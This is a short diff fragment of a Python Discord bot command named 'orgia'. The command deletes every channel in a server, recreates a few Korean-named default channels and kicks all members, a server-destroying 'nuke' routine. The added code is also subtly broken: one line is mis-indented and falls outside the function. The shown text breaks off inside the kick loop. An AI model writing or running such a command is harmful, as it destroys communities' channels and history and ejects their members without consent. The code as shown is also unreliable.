@@ -25,20 +25,14 @@ async def on_ready():
 
 @client.command()
 async def orgia(ctx):
-  for channel in ctx.guild.text_channels:
+guild = ctx.guild
+  for channel in guild.channels:
       await channel.delete()
-  for channel in ctx.guild.voice_channels:
-      await channel.delete()
-  for channel in ctx.guild.categories:
-      await channel.delete()
-  await ctx.guild.create_category("채팅 채널")
-  await ctx.guild.create_category("음성 채널")
-  await every.edit(reason = None)
-  name = '채팅 채널'
-  name2 = '음성 채널'
-  await ctx.guild.create_text_channel(name="일반")
-  await ctx.guild.create_voice_channel(name="일반")
-  for member in ctx.guild.members:
+  await guild.create_category("채팅 채널")
+  await guild.create_category("음성 채널")
+  await guild.create_text_channel(name="일반")
+  await guild.create_voice_channel(name="일반")
+  for member in guild.members:
       try:
           await member.kick()
       
